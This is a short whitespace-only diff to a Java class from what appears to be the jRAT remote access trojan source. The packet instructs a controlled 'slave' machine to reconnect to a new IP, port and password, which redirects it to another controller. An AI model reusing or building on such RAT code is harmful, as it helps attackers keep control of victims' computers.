@@ -5,7 +5,6 @@ import java.io.DataOutputStream;
 import pro.jrat.Slave;
 import pro.jrat.exceptions.CloseException;
 
-
 public class Packet75Redirect extends AbstractOutgoingPacket {
 
 	private String ip;
@@ -23,7 +22,7 @@ public class Packet75Redirect extends AbstractOutgoingPacket {
 		slave.writeLine(ip);
 		dos.writeInt(port);
 		slave.writeLine(pass);
-		
+
 		slave.closeSocket(new CloseException("Redirecting..."));
 	}
 
